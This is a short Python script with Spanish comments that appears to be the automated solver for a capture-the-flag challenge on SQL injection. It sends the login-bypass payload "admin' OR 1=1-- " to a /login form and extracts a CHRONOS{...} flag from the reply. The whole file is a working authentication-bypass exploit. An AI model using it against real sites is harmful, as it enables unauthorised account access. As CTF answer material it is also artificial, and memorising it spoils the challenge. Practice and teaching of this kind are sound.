#!/usr/bin/env python3
"""
ChronosCTF 2026 - Exploit Automatizado
Reto: Inyección Clásica (SQLi)
"""

import sys
import re
import urllib.request
import urllib.parse
import http.cookiejar


def solve(target_url: str) -> bool:
    print(f"[*] Conectando con el objetivo: {target_url}")
    login_url = target_url.rstrip("/") + "/login"
    
    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
    
    # Payload clásico de SQLi para bypass de login
    payload = "admin' OR 1=1-- "
    data = urllib.parse.urlencode({
        "username": payload,
        "password": "anypassword"
    }).encode("utf-8")
    
    req = urllib.request.Request(login_url, data=data, method="POST")
    
    try:
        with opener.open(req, timeout=10) as response:
            html = response.read().decode("utf-8")
            
            match = re.search(r"CHRONOS\{[^}]+\}", html)
            if match:
                flag = match.group(0)
                print(f"[+] ¡Éxito! Flag recuperada: {flag}")
                return True
            else:
                print("[-] No se encontró la bandera en el dashboard.")
                return False
    except Exception as e:
        print(f"[-] Error durante la solicitud HTTP: {e}")
        return False


if __name__ == "__main__":
    url = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5000"
    success = solve(url)
    sys.exit(0 if success else 1)
